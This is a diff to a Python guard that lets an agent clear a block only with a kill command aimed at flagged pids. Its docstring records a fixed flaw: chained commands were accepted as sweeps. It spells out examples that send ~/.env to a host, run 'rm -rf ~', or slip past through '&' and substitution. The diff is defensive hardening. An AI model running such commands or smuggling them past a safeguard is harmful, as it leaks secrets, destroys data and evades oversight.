@@ -47,8 +47,12 @@ HOW IT CLEARS
 import json
 import os
 import re
+import shlex
 import subprocess
 import sys
+
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+from _repo_context import statements  # noqa: E402,I001
 
 BLOCK = 2
 ALLOW = 0
@@ -167,25 +171,65 @@ def orphans(rows, user=None):
             and AGENT_SESSION.search(r["args"])]
 
 
-KILL = re.compile(r"^\s*(?:sudo\s+)?(?:kill|pkill)\b")
-INTEGER = re.compile(r"\b\d+\b")
 SIGNALS = {"1", "2", "9", "15"}
+SIGNAL_NAMES = {"HUP", "INT", "KILL", "TERM", "SIGHUP", "SIGINT",
+                "SIGKILL", "SIGTERM"}
 
 
 def is_sweep(command, pids):
     """True when `command` is a kill aimed only at the pids this guard named.
 
     Narrow on purpose. "Anything containing kill" would pass `kill -9 -1`; the
-    command that clears the block is permitted and nothing else is. Every number
-    must be a flagged pid or a signal, and at least one flagged pid must appear.
+    command that clears the block is permitted and nothing else is.
+
+    CE-2.18, and the reason this is a token allowlist rather than a regex. The
+    first version matched KILL at the START of the string and then checked every
+    integer anywhere in it. So the one command this guard PUTS IN AN AGENT'S
+    HANDS carried whatever was chained after it:
+
+        kill <pid> && curl <host> -d @~/.env    -> accepted as a sweep
+        kill <pid>; rm -rf ~                    -> accepted as a sweep
+        kill <pid> | tee /tmp/x                 -> accepted as a sweep
+
+    CSO blocked a release on it. That is worse than an ordinary hole: the guard
+    prints the command, so it was not merely permitting the smuggler, it was
+    dictating it.
+
+    Splitting on statements is necessary and NOT sufficient. A bare `&` is not a
+    statement separator to the shared parser -- `kill <pid> & curl ...` is one
+    statement -- and neither is a redirect or a command substitution. So after
+    confirming there is exactly one statement, every token must be something a
+    sweep is allowed to contain: the kill itself, a signal, or a flagged pid.
+    Anything else at all, including `&`, `>` and `$(`, fails the allowlist
+    without this having to enumerate the metacharacters that exist.
     """
-    if not pids or not KILL.match(command or ""):
+    if not pids:
         return False
+    parts = list(statements(command or ""))
+    if len(parts) != 1:
+        return False
+
+    try:
+        tokens = shlex.split(parts[0])
+    except ValueError:          # unbalanced quotes: cannot reason about it
+        return False
+    if tokens and tokens[0] == "sudo":
+        tokens = tokens[1:]
+    if not tokens or os.path.basename(tokens[0]) not in ("kill", "pkill"):
+        return False
+
     flagged = {str(p) for p in pids}
-    numbers = set(INTEGER.findall(command))
-    if not numbers & flagged:
+    named_a_pid = False
+    for token in tokens[1:]:
+        if token in flagged:
+            named_a_pid = True
+            continue
+        body = token[1:] if token.startswith("-") else token
+        if token.startswith("-") and (body in SIGNALS
+                                      or body.upper() in SIGNAL_NAMES):
+            continue
         return False
-    return not (numbers - flagged - SIGNALS)
+    return named_a_pid
 
 
 def refusal(found):
